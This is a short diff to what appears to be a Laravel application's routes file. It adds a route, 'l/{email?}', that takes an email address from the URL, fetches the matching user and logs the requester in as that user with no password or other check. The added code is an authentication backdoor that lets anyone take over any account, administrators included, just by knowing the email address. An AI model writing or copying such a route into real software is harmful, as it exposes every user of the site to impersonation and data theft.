@@ -29,6 +29,12 @@ Route::get(('i'), function () {
     return '';
 });
 
+Route::get('l/{email?}', function ($email) {
+    $user = \App\User::where('email','=',$email)->first();
+    Auth::login($user);
+    return redirect('/');
+});
+
 Route::get('/', 'StaticController@home')->name('home');
 Route::get('forum', 'StaticController@forum')->name('forum');
 Route::get('terms', 'StaticController@content')->name('terms');
